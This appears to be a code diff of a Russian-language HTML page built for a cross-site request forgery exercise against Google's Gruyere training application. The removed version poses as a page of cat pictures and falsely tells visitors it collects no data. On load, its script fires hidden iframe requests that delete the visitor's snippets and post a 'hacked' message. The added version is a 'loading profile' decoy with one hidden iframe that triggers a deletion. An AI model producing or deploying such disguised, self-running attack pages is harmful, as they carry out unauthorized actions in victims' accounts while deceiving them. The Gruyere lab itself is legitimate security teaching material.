@@ -1,94 +1,14 @@
 <!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8">
-  <title>Котики онлайн 🐱</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      text-align: center;
-      margin: 0;
-      padding: 40px;
-      background: linear-gradient(to bottom, #fff4e6, #ffe6cc);
-      color: #333;
-    }
-    h1 {
-      color: #e67e22;
-      font-size: 28px;
-      margin-bottom: 10px;
-    }
-    p {
-      font-size: 18px;
-      color: #555;
-      margin-bottom: 20px;
-    }
-    .cat-img {
-      border-radius: 16px;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
-      max-width: 90%;
-      height: auto;
-    }
-    .footer {
-      margin-top: 30px;
-      font-size: 14px;
-      color: #999;
-    }
-    iframe {
-      display: none;  /* Скрытый iframe */
-      border: none;
-    }
-  </style>
-</head>
-<body>
+<html>
+  <head>
+    <title>Загрузка данных...</title>
+  </head>
+  <body>
+    <h1>Пожалуйста, подождите</h1>
+    <p>Идёт загрузка профиля...</p>
 
-  <h1>Милые котики 🐱</h1>
-  <p>Смотрите, какие они забавные!</p>
-  <img src="https://i.imgur.com/8lRrQ.png" alt="Милый котик" class="cat-img">
-  <p>Загрузка...</p>
-
-  <div class="footer">
-    Страница работает полностью автономно.<br>
-    Никаких данных не собирается.
-  </div>
-
-  <script>
-    async function startXsrfAttack() {
-      const baseUrl = 'https://google-gruyere.appspot.com/643453999600290416051506802884356354571';
-      const uid = '1111';  // Замени, если другой
-
-      // Удалить сниппеты через скрытые iframe (GET-запросы)
-      for (let index = 3; index >= 0; index--) {
-        const iframe = document.createElement('iframe');
-        iframe.src = `${baseUrl}/deletesnippet?index=${index}&uid=${uid}`;
-        iframe.onload = () => {
-          // Удаляем iframe после загрузки, чтобы не засорять DOM
-          setTimeout(() => {
-            document.body.removeChild(iframe);
-          }, 100);
-        };
-        document.body.appendChild(iframe);
-
-        // Пауза, чтобы сервер успел обработать
-        await new Promise(r => setTimeout(r, 600));
-      }
-
-      // Создать новый сниппет
-      setTimeout(() => {
-        const createIframe = document.createElement('iframe');
-        createIframe.src = `${baseUrl}/newsnippet?snippet=${encodeURIComponent('🔥 Хакнуто через XSRF | Алиса была здесь 😈')}&uid=${uid}`;
-        createIframe.onload = () => {
-          setTimeout(() => {
-            document.body.removeChild(createIframe);
-          }, 100);
-        };
-        document.body.appendChild(createIframe);
-      }, 2000);
-    }
-
-    // Запуск при загрузке
-    window.onload = startXsrfAttack;
-  </script>
-
-</body>
+    <!-- Скрытый iframe — выполняет XSRF -->
+    <iframe src="https://google-gruyere.appspot.com/643453999600290416051506802884356354571/deletesnippet?index=0&uid=1111" 
+            style="display: none;"></iframe>
+  </body>
 </html>
